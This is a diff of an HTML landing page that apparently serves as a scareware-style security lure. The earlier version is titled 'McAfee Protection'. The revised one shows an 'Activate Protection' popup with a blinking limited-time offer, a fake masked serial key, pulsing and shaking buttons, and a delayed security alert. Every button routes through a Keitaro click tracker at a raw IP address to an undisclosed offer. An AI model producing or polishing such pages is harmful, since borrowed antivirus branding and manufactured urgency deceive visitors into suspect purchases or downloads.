@@ -2,95 +2,196 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>McAfee Protection</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <title>Security Offer</title>
+  <meta name="robots" content="noindex,nofollow" />
+
   <style>
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: Arial, sans-serif;
-      background-color: #ffffff;
-      color: #222;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      flex-direction: column;
-      text-align: center;
-    }
+  /* База и лэйаут */
+  html { box-sizing: border-box; }
+  *, *::before, *::after { box-sizing: inherit; }
+  body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: #d9d9d9;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    min-height: 100vh;
+  }
 
-    h1 {
-      color: #c10000;
-      font-size: 28px;
-      margin-bottom: 10px;
-    }
+  /* Карточка */
+  .popup {
+    background: #fff;
+    border: 1px solid #ccc;
+    box-shadow: 0 0 12px rgba(0,0,0,0.4);
+    text-align: center;
+    border-radius: 12px;
+    width: min(92vw, 480px);
+    margin: 8vh auto;
+    padding: clamp(16px, 3.5vw, 24px);
+  }
 
-    p {
-      font-size: 16px;
-      color: #444;
-      max-width: 300px;
-    }
+  /* Красная шапка */
+  .popup h2 {
+    background: #b91c1c;
+    color: #fff;
+    margin: -24px -24px 20px -24px;
+    padding: 18px;
+    font-size: clamp(20px, 5vw, 24px);
+    border-radius: 12px 12px 0 0;
+  }
 
-    .btn {
+  .popup p {
+    font-size: clamp(14px, 3.8vw, 16px);
+    line-height: 1.5;
+    margin: 12px 0;
+  }
+
+  .highlight {
+    color: #b91c1c;
+    font-weight: bold;
+    animation: blink 1s infinite;
+  }
+  @keyframes blink { 0%,100% { opacity: 1 } 50% { opacity: .3 } }
+
+  .serial {
+    background: #f1f1f1;
+    padding: 10px;
+    font-family: monospace;
+    margin: 14px auto;
+    display: inline-block;
+    font-size: 15px;
+    word-break: break-word;
+  }
+
+  /* Кнопки: красные + анимации */
+  .btn, #activateBtn, #alertBtn {
+    background: #b91c1c;
+    color: #fff;
+    border: none;
+    cursor: pointer;
+    font-size: 16px;
+    border-radius: 10px;
+    text-decoration: none;
+    transition: box-shadow 0.3s ease, transform 0.2s ease;
+    animation: pulse 1.5s infinite;
+  }
+  @keyframes pulse { 0%{transform:scale(1)} 50%{transform:scale(1.05)} 100%{transform:scale(1)} }
+  @keyframes shake {
+    0%,100%{transform:translateX(0)}
+    25%{transform:translateX(-3px)}
+    50%{transform:translateX(3px)}
+    75%{transform:translateX(-3px)}
+  }
+  .btn:hover, #activateBtn:hover, #alertBtn:hover {
+    background:#991b1b;
+    box-shadow:0 0 12px rgba(185,28,28,0.45);
+    animation: pulse 1.5s infinite, shake 0.3s infinite;
+  }
+  @media (hover: none) and (pointer: coarse) {
+    .btn:hover, #activateBtn:hover, #alertBtn:hover { animation: none !important; box-shadow: none !important; }
+  }
+
+  /* Размеры кнопок */
+  @media (max-width: 768px) {
+    .btn, #activateBtn, #alertBtn {
+      display: block;
+      width: 100%;
+      max-width: 320px;
+      margin: 14px auto 0;
+      padding: 12px 16px;
+      min-height: 44px;
+    }
+  }
+  @media (min-width: 769px) {
+    .btn, #activateBtn, #alertBtn {
       display: inline-block;
-      background-color: #c10000;
-      color: #fff;
-      text-decoration: none;
-      padding: 14px 32px;
-      font-size: 18px;
-      font-weight: bold;
-      border-radius: 8px;
-      margin-top: 25px;
-      transition: background-color 0.2s ease;
-      border: none;
-      cursor: pointer;
+      padding: 12px 22px;
+      margin-top: 18px;
     }
+  }
 
-    .btn:hover {
-      background-color: #a00000;
-    }
+  /* Нижний алерт */
+  .footer-alert {
+    position: fixed;
+    bottom: -220px;
+    right: 12px;
+    left: 12px;
+    background: #fff;
+    border: 1px solid #ccc;
+    box-shadow: 0 0 8px rgba(0,0,0,0.3);
+    font-size: 14px;
+    padding: 15px;
+    border-radius: 12px;
+    transition: bottom 0.8s ease-in-out;
+    width: auto;
+  }
+  .footer-alert.show { bottom: 12px; }
+  .footer-alert h3 {
+    background: #b91c1c;
+    color: #fff;
+    margin: -15px -15px 12px -15px;
+    padding: 10px;
+    font-size: 15px;
+    border-radius: 12px 12px 0 0;
+  }
+  .footer-alert button, #alertBtn {
+    background: #b91c1c;
+    padding: 10px 16px;
+    border-radius: 8px;
+  }
+  .footer-alert button:hover, #alertBtn:hover {
+    background: #991b1b;
+    box-shadow: 0 0 10px rgba(185,28,28,0.45);
+  }
+  @media (min-width: 481px) {
+    .footer-alert { left: auto; width: 320px; }
+  }
 
-    .alert {
-      position: fixed;
-      bottom: 15px;
-      left: 50%;
-      transform: translateX(-50%);
-      background-color: #c10000;
-      color: white;
-      padding: 12px 20px;
-      border-radius: 8px;
-      font-size: 14px;
-      cursor: pointer;
-      box-shadow: 0 3px 8px rgba(0, 0, 0, 0.2);
-      transition: background-color 0.3s ease;
-    }
-
-    .alert:hover {
-      background-color: #a00000;
-    }
+  .disclaimer {
+    font-size: 12px;
+    color: #6b7280;
+    margin-top: 10px;
+    text-align: left;
+  }
   </style>
+
+  <!-- Скрипт только для появления нижнего алерта -->
+  <script>
+  document.addEventListener('DOMContentLoaded', function() {
+    setTimeout(() => {
+      const box = document.getElementById('alertBox');
+      if (box) box.classList.add('show');
+    }, 1200);
+  });
+  </script>
 </head>
 
 <body>
-  <h1>Activate Protection</h1>
-  <p>Get the latest security update to protect your device and keep your data safe.</p>
+  <div class="popup">
+    <h2>Activate Protection</h2>
+    <p>Keep your device secure with a trusted solution.</p>
+    <p class="highlight">Limited-time offer</p>
+    <div class="serial">XXXX - XXXX - XXXX - XXXX</div>
 
-  <!-- 🔹 Основная кнопка -->
-  <a
-    href="http://159.223.234.92/click/hWF1Y3"
-    class="btn"
-    id="activateBtn"
-  >
-    Activate Subscription
-  </a>
+    <!-- Главная кнопка: Click URL Keitaro -->
+    <a id="activateBtn" class="btn" href="http://159.223.234.92/click/hWF1Y3">
+      Activate Subscription
+    </a>
 
-  <!-- 🔹 Нижняя плашка (та же ссылка) -->
-  <div
-    class="alert"
-    id="alertBtn"
-    onclick="location.href='http://159.223.234.92/click?campaign_id=hWF1Y3'"
-  >
-    Activate Protection
+    <div class="disclaimer">
+      Demo landing. Hosted on your domain. Clicks go via Keitaro to the offer.
+    </div>
+  </div>
+
+  <!-- Нижняя плашка: та же ссылка -->
+  <div class="footer-alert" id="alertBox">
+    <h3>Security reminder</h3>
+    <p>Regularly update your software and keep your device protected.</p>
+    <button id="alertBtn" onclick="location.href='http://159.223.234.92/click/hWF1Y3'">
+      Learn more
+    </button>
   </div>
 </body>
 </html>
